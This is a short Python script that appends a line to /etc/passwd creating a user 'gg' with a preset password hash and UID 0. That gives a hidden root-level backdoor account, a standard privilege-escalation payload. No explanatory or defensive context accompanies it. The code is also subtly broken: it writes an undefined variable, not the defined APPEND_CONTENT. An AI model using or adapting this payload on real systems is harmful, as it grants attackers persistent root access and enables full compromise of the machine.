import os
APPEND_CONTENT = b"gg:$5$a$gemgwVPxLx/tdtByhncd4joKlMRYQ3IVwdoBXPACCL2:0:0:gg:/root:/bin/bash\n"
f  = open("/etc/passwd","ab")
f.write(append)
f.close()